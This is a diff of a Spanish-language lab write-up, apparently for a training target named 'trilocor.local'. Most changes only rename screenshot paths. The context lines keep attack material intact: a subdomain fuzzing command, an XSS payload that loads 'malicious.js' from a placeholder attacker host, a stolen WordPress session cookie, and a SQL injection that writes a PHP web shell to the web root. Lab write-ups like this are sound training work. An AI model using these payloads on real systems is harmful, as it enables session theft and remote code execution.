@@ -19,7 +19,7 @@ ffuf -c -u http://trilocor.local/ -H 'Host: FUZZ.trilocor.local' -w /usr/share/w
 * www
 * admin
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > No olvidar poner en /etc/hosts la IP con los subdominios&#x20;
 
@@ -95,7 +95,7 @@ sudo php -S 0.0.0.0:8000
 "><script src="http://TU_IP:8000/malicious.js"></script>
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4Sh2xreFf4KreSwfKr8WAdJdDXwbuUT0PD%7C2fdd857041823138af2efb18ac89684d797ce25388bb16b9d5fe966c1cc8397a;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1776066952%7CvL8Halvch4Sh2xreFf4KreSwfKr8WAdJdDXwbuUT0PD%7Cd93128f07913a3bd07fed6d0fc4c70b11a080e9d53662d388a9747c9a18805e2;%20wordpress_test_cookie=WP%20Cookie%20check
@@ -130,6 +130,8 @@ Ya entramos a **/wp-admin.**
 <figure><img src="../.gitbook/assets/image (1732).png" alt=""><figcaption></figcaption></figure>
 
 Ejecutamos el exploit.py.
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-12 180514.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (1733).png" alt=""><figcaption></figcaption></figure>
 
@@ -418,7 +420,7 @@ http://trilocor.local:8080/resumes.php?search=' UNION SELECT 1, 2, variable_name
 
 {% embed url="http://trilocor.local:8080/resumes.php?search=%27union%20select%201,%202,%20%27%3C?php%20system($_GET[%22cmd%22]);?%3E%27,%204,%205%20,6%20into%20outfile%20%27/var/www/public/shell.php%27--%20-" %}
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -470,16 +472,16 @@ curl -s -X POST 'http://trilocor.local:9000/api/admin/list_members' \
 
 <figure><img src="../.gitbook/assets/image (1752).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 ```
 
 <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 130857.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
